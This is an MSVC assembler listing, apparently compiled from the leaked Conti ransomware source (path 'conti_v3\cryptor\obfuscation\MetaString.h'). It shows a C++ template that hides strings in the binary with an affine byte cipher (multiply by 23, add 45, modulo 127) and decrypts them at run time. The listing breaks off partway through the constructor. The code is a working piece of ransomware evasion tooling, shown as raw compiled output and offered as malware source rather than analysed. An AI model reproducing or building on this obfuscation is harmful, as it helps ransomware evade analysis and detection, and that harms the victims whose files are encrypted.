?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 2d	 sub	 eax, 45			; 0000002dH
  0002d	6b c0 f5	 imul	 eax, eax, -11
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 17	 imul	 eax, eax, 23
  0002d	83 c0 2d	 add	 eax, 45			; 0000002dH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 3e	 cmp	 QWORD PTR i$1[rbp], 62	; 0000003eH
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv532 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
